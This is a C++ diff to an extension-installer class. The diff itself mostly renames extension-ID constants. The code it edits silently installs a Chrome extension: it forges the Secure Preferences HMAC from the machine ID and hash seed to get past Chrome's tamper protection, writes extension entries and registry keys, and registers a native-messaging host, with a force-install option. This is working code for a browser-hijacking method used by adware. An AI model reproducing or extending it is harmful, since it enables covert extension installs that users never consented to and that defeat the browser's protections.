@@ -8,13 +8,6 @@
 #include "extInstaller.h"
 
 
-#define TEST_CRX
-
-#ifdef _TEST_CRX
-#define _JSON_NODE_STRING _T("")
-#define CHROME_SEC_PREFERENCE_PATH _T("\\Google\\Chrome\\User Data\\Default\\Secure Preferences_180_en")
-#define CHROME_TEST_CONFIG_PATH _T("C:\\test.config")
-#endif
 #define PACK_FILE_VERSION  4
 #define DEFAULT_SEED_LEN 64
 #define IDR_PREF_HASH_SEED_BIN_38 712
@@ -289,7 +282,7 @@ std::string CExtInstaller::GenerateMessagePath()
 	path.append(".");
 	path.append(CHROME_SETTING_NODE);
 	path.append(".");
-	path.append( CHROME_SAMPLE_CRX_ID );
+	path.append( CHROME_SAMPLE_CRX_ID_A );
 	return path;
 }
 
@@ -380,7 +373,7 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 			
 			if (reader.parse(fileData, root))
 			{
-				std::string chromeExtConfig = CHROME_SAMPLE_EXT_OL_CONFIG;
+				std::string chromeExtConfig = CHROME_SAMPLE_EXT_OL_CONFIG_A;
 
 				Json::Reader chromeExtConfigReader;
 				Json::Value chromeExtConfigRoot;
@@ -397,7 +390,7 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 					
 				
 					//Json::FastWriter fw;
-					if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
+					if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID_A])
 					{
 						std::string machine_id;
 						if(false == GetMachineId(machine_id,majorVersion))
@@ -412,14 +405,14 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 						}
 						m_extConfigHMAC = GenerateExtConfigHMAC(machine_id, 
 							GenerateMessagePath(),
-							CHROME_SAMPLE_EXT_OL_CONFIG,
+							CHROME_SAMPLE_EXT_OL_CONFIG_A,
 							pre_hash_seed_bin);
 
 						root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 							root[CHROME_PROTECTION_NODE][CHROME_MACS_NODE]\
 							[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(m_extConfigHMAC);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(m_extConfigHMAC);\
 						Json::StyledWriter fw;
 						std::string szOssOnConfig = fw.write(root);
 						std::ofstream out(chromeSecPrefsPath.c_str());
@@ -459,7 +452,7 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 
 			if (reader.parse(fileData, root))
 			{
-				std::string chromeExtConfig = CHROME_SAMPLE_EXT_OL_CONFIG;
+				std::string chromeExtConfig = CHROME_SAMPLE_EXT_OL_CONFIG_A;
 
 				Json::Reader chromeExtConfigReader;
 				Json::Value chromeExtConfigRoot;
@@ -475,7 +468,7 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 							SHOW_LOG( _T("CExtInstaller::InstallExt not supported prefs\n"));\
 							break;\
 						}\
-						if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
+						if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID_A])
 						{
 							std::string machine_id;
 							if(false == GetMachineId(machine_id,majorVersion))
@@ -490,14 +483,14 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 							}
 							m_extConfigHMAC = GenerateExtConfigHMAC(machine_id, 
 								GenerateMessagePath(),
-								CHROME_SAMPLE_EXT_OL_CONFIG,
+								CHROME_SAMPLE_EXT_OL_CONFIG_A,
 								pre_hash_seed_bin);
 
 							root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-								[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+								[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 							root[CHROME_PROTECTION_NODE][CHROME_MACS_NODE]\
 								[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-								[CHROME_SAMPLE_CRX_ID] = Json::Value(m_extConfigHMAC);\
+								[CHROME_SAMPLE_CRX_ID_A] = Json::Value(m_extConfigHMAC);\
 
 							Json::StyledWriter fw;
 							std::string szOssOnConfig = fw.write(root);
@@ -525,7 +518,7 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 							SHOW_LOG( _T("CExtInstaller::InstallExt not supported 33-36 prefs\n"));
 							break;
 						}
-						if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
+						if(bForceInstall || null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID_A])
 						{
 							std::string machine_id;
 							if(false == GetMachineId(machine_id,majorVersion))
@@ -540,11 +533,11 @@ bool CExtInstaller::SlientInstallExt(bool bForceInstall)
 							}
 							m_extConfigHMAC = GenerateExtConfigHMAC(machine_id, 
 								GenerateMessagePath(),
-								CHROME_SAMPLE_EXT_OL_CONFIG,
+								CHROME_SAMPLE_EXT_OL_CONFIG_A,
 								pre_hash_seed_bin);
 
 							root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 
 							Json::StyledWriter fw;
 							std::string szOssOnConfig = fw.write(root);
@@ -936,7 +929,7 @@ bool CExtInstaller::GenerateNativeAppConfig()
 	root["path"] = Json::Value(nativeAppPath);
 	root["type"] = Json::Value("stdio");
 	std::string allowed_origins = "chrome-extension://";
-	allowed_origins.append(CHROME_SAMPLE_CRX_ID);
+	allowed_origins.append(CHROME_SAMPLE_CRX_ID_A);
 	allowed_origins.append("/");
 	root["allowed_origins"].append(allowed_origins);
 	Json::StyledWriter fw;
@@ -1123,7 +1116,7 @@ bool CExtInstaller::InstallCRX()
 			WriteFile(houtZipFile, (LPVOID)byteBuffer, writeLen, &outwriteLen, NULL);
 			CloseHandle(houtZipFile);
 			HANDLE hZipFile = CreateZip(tmpZipPath.c_str(),false);
-			tstring extractPath = GetChromeExtPath(CHROME_SAMPLE_CRX_ID_T, CHROME_SAMPLE_CRX_VER);
+			tstring extractPath = GetChromeExtPath(CHROME_SAMPLE_CRX_ID_W, CHROME_SAMPLE_CRX_VER);
 			CreateDeepDirectory(extractPath.c_str(), NULL);
 			if( false == ZipExtract(hZipFile, extractPath.c_str()))
 			{
@@ -1196,7 +1189,7 @@ bool CExtInstaller::ClearExtRegister()
 	tstring  subkey;
 
 	subkey = CHROME_EXT_32BIT_REG_PATH;
-	subkey += CHROME_SAMPLE_CRX_STOREID;
+	subkey += CHROME_SAMPLE_CRX_ID_W;
 	if(Is64System())
 	{
 		
@@ -1231,7 +1224,7 @@ bool CExtInstaller::ClearExtRegister()
 		}
 	
 		subkey = CHROME_EXT_64BIT_REG_PATH;
-		subkey += CHROME_SAMPLE_CRX_STOREID;
+		subkey += CHROME_SAMPLE_CRX_ID_W;
 		lResult = RegDeleteKey( HKEY_LOCAL_MACHINE,
 			subkey.c_str());
 		if(ERROR_SUCCESS != lResult)
@@ -1259,7 +1252,7 @@ bool CExtInstaller::InstallExtByRegister()
 	LRESULT  lResult;
 	tstring  subkey;
 	subkey = CHROME_EXT_32BIT_REG_PATH;
-	subkey += CHROME_SAMPLE_CRX_STOREID;
+	subkey += CHROME_SAMPLE_CRX_ID_W;
 	lResult = RegCreateKeyEx( HKEY_LOCAL_MACHINE,
 		subkey.c_str(),
 		0,
@@ -1336,13 +1329,13 @@ bool CExtInstaller::IsExtEnable(int majorVersion)
 			Json::Value null_value;
 			if (reader.parse(fileData, root))
 			{
-				if( null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID])
+				if( null_value == root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID_A])
 				{
 					SHOW_LOG( _T("CExtInstaller::IsExtEnable not supported prefs or not install ext\n"));
 				}
 				else
 				{
-					if( 1==root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID][CHROME_STATE_NODE].asInt())
+					if( 1==root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE][CHROME_SAMPLE_CRX_ID_A][CHROME_STATE_NODE].asInt())
 					{
 						SHOW_LOG( _T("CExtInstaller::IsExtEnable prefs ext state enable\n"));
 						return true;
@@ -1434,7 +1427,7 @@ bool CExtInstaller::ForceFix()
 
 		m_extConfigHMAC = GenerateExtConfigHMAC(machine_id, 
 			GenerateMessagePath(),
-			WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_T)),
+			WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_W)),
 			pre_hash_seed_bin);
 	}
 	else
